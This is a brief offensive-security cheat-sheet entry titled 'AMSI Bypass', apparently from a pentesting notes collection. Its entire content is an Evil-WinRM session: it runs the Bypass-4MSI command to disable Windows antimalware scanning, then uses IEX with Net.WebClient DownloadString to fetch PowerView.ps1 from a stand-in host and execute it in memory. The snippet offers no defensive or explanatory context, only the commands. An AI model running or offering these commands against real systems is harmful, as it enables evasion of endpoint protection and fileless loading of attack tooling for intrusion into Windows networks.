## AMSI Bypass



### Evil-WinRM + IEX

```
*Evil-WinRM* PS > menu
*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```


